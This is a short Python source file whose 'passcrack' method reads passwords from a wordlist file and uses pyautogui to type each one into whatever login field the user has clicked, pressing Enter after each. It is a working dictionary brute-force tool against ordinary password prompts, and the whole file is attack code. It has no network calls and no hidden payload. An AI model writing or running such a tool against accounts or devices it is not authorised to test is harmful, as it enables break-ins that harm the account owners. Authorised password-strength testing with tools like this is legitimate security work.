#coding: utf-8
# -*- coding:utf-8 -*-

import sys
import time
import pyautogui
import os.path

class service:
    
    def __init__(self):
        self.error = None

    def inputlist(self):
        self.passcrack('./Service/wordlist.txt')

    def passcrack(self, file_name):
        word_list = open(file_name, 'r')
        words = word_list.read()
        word_list.close()
        word_list = words.split("\n")
        print('CLICK ON THE FIELD!')
        time.sleep(5)

        for word in word_list[0::]:
            pyautogui.hotkey('ctrl', 'a')
            time.sleep(1)
            pyautogui.typewrite(word, interval=0.0001)
            pyautogui.typewrite(['enter'])
            print(word)

